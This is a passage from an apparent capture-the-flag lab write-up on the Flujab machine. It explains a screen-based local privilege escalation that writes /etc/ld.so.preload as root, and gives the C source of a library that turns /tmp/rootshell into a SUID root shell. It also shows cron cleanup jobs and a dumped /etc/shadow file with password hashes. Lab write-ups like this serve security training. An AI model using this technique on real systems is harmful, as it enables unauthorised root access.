root@kali# ./flujab_sysadm_shell.sh
[+] Added 10.10.14.8 to whitelist
[*] Will log into Ajenti
[*] Can take up to two minutes for whitelist to propegate
[+] Got session cookie: 33d4c8061ff0f43b4fba06611f5dd84c7dfcd975
[+] Added 10.10.14.8 to /etc/hosts.allow
[+] Uploaded private key to /home/sysadm/access
[+] AuthorizedKeyFile changed to 600
sysadm@flujab:~$

```

### screen Exploit Details

This exploit is pretty simple. Because `screen` has to run as root, it takes advantage of the fact that the log file is also opened as root, even when the user specifies the path to the log file. When I run `/usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"`, that creates that file as root, and writes ““/tmp/libhax.so” into the file. The run is using the following arguments:
- `-D` - Do not start `screen`, but instead detach a `screen` session running elsewhere.
- `-m` - Tell `screen` to ignore the `$STY` variable, and a new session will always be created.
- `-L [file]` - Turn on logging to the given file.
- `echo -ne [message]` - Display a message on startup.

So this command starts screen, prints a message, which is recorded in the log file, and then exits. This is a simple arbitrary write as root.

Because of the special meaning of `/etc/ld.so.preload`, it’s difficult to show, but I’ll show a dummy file:

```

drno@flujab:/tmp$ /usr/local/share/screen/screen -D -m -L 0xdf echo -ne "writing as root"
writing as root

drno@flujab:/tmp$ ls -l 0xdf 
-rw-rw-rw- 1 root drno 15 Jun 14 23:17 0xdf

drno@flujab:/tmp$ cat 0xdf 
writing as root

```

So how is this script using this arbitrary write? It’s writing to the `/etc/ld.so.preload` file. According to the [ld.so man page](https://linux.die.net/man/8/ld.so), this is a:

> File containing a whitespace-separated list of ELF shared libraries to be loaded before the program.

So I put `/tmp/libhax.so` into that file. And that’s one of the files I uploaded. I’ll look at the source:

```

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}

```

This is very simple. It’s going to change the owner of `/tmp/rootshell` to root. It will then set it as SUID. And then it will remove the `ld.so.preload` file, cleaning up. Then it prints a done message. So the next command I run after writing to `/etc/ld.so.preload` will load this library, which sets `/tmp/rootshell` to SUID owned by root, and then I can run that to get a root shell.

### Cleanup Scripts

I always find it interesting to look at how the box was working behind the scenes. There’s an interesting set of cronjobs:

```

root@flujab:/root# crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/1 * * * * /usr/bin/sort -u /var/tmp/tmp_whitelist /etc/nginx/adminwl > /etc/nginx/whitelist && /usr/sbin/service nginx restart
*/15 * * * * /bin/rm -rf /tmp/*
*/15 * * * * cat /root/sshd_wl > /etc/ssh/sshd_wl
0 0 * * * > /var/tmp/tmp_whitelist

```

So every minute, a unique list of the items in `/vat/tmp/tmp_whitelist` and `/etc/nginx/adminwl` is dumped and written back to `/etc/nginx/whitelist`. Then the service for `nginx` is restarted. This explains why my IP showed up immediately on `/?whitelist`, but it took up to a minute to propagate to the Ajenti page.

`/tmp` and the `sshd_wl` are both cleared every 15 minutes.

### nursejackie

If I run `su - nursejackie`, I’m given a shell as nursejackie without being asked for a password:

```

drno@flujab:/home$ su - nursejackie
nursejackie@flujab:~$

```

I can see why in the `/etc/shadow` file:

```

root:$6$uUrMyfe7$tb4N4UX4KaveaNMbBTvOs.0PeGcFUTa7HXIWPZgJTEVd176Im9bgwROxEApmYByw4.w4D2y5PnJk4sHHZY0uJ.:17866:0:99999:7:::
daemon:*:17862:0:99999:7:::                   
bin:*:17862:0:99999:7:::
sys:*:17862:0:99999:7:::
sync:*:17862:0:99999:7:::
games:*:17862:0:99999:7:::
man:*:17862:0:99999:7:::                                         
lp:*:17862:0:99999:7:::
mail:*:17862:0:99999:7:::  
news:*:17862:0:99999:7:::
uucp:*:17862:0:99999:7:::       
proxy:*:17862:0:99999:7:::        
www-data:*:17862:0:99999:7:::
backup:*:17862:0:99999:7:::                                
list:*:17862:0:99999:7:::                                                               
irc:*:17862:0:99999:7:::
gnats:*:17862:0:99999:7:::                     
nobody:*:17862:0:99999:7:::
systemd-timesync:*:17862:0:99999:7:::  
systemd-network:*:17862:0:99999:7:::
systemd-resolve:*:17862:0:99999:7:::
systemd-bus-proxy:*:17862:0:99999:7:::
_apt:*:17862:0:99999:7:::
messagebus:*:17862:0:99999:7:::
sshd:*:17862:0:99999:7:::
drno:*:17862:0:99999:7:::
mysql:!:17862:0:99999:7:::
nursejackie::17866:0:99999:7:::
sysadm:$6$QBI6Cm4Y$sC07ml2o9iZ5RNX.2Vc8iS8rLyF8.W1kqyBBDv6AJyiPkTHdkKU0SwFWFm4Vko71UJ3ZoW5voXM9lJ52eK0/b1:17867:0:99999:7:::
drblack:!:17867:0:99999:7:::
drwhite:!:17867:0:99999:7:::
drstrange:!:17867:0:99999:7:::
drfoster:!:17867:0:99999:7:::
dryi:!:17867:0:99999:7:::
drpo:!:17867:0:99999:7:::
drsmith:!:17867:0:99999:7:::                            
drjones:!:17867:0:99999:7:::
drgreene:!:17867:0:99999:7:::                     
drshipman:!:17867:0:99999:7:::
drwho:!:17867:0:99999:7:::
nursepeter:!:17867:0:99999:7:::
nurseyi:!:17867:0:99999:7:::
nursemoe:!:17867:0:99999:7:::
drcrick:!:17867:0:99999:7:::
drstones:!:17867:0:99999:7:::                                   
nursewhitstone:!:17867:0:99999:7:::   
nursetumble:!:17867:0:99999:7:::
nursewaters:!:17867:0:99999:7:::                        
nursewalters:!:17867:0:99999:7:::
nursebluecoats:!:17867:0:99999:7:::
drme:!:17867:0:99999:7:::
drnu:!:17867:0:99999:7:::
drre:!:17867:0:99999:7:::
drdre:!:17867:0:99999:7:::

```

Every account has either a `!` or a `*` for the password hash, except for root, nursejackie, and sysadm:

```

# grep -F -e ':*:' -e ':!:' -v /etc/shadow
root:$6$uUrMyfe7$tb4N4UX4KaveaNMbBTvOs.0PeGcFUTa7HXIWPZgJTEVd176Im9bgwROxEApmYByw4.w4D2y5PnJk4sHHZY0uJ.:17866:0:99999:7:::
nursejackie::17866:0:99999:7:::
sysadm:$6$QBI6Cm4Y$sC07ml2o9iZ5RNX.2Vc8iS8rLyF8.W1kqyBBDv6AJyiPkTHdkKU0SwFWFm4Vko71UJ3ZoW5voXM9lJ52eK0/b1:17867:0:99999:7:::

```

The Linux [man page for shadow](https://linux.die.net/man/5/shadow) says:

> If the password field contains some string that is not a valid result of **crypt**(3), for instance ! or \*, the user will not be able to use a unix password to log in (but the user may log in the system by other means).
>
> This field may be empty, in which case no passwords are required to authenticate as the specified login name. However, some applications which read the /etc/shadow file may decide not to permit any access at all if the password field is empty.

I suspect this is just a typo on the author’s part, and that nursejackie should have had a `*` or a `!`.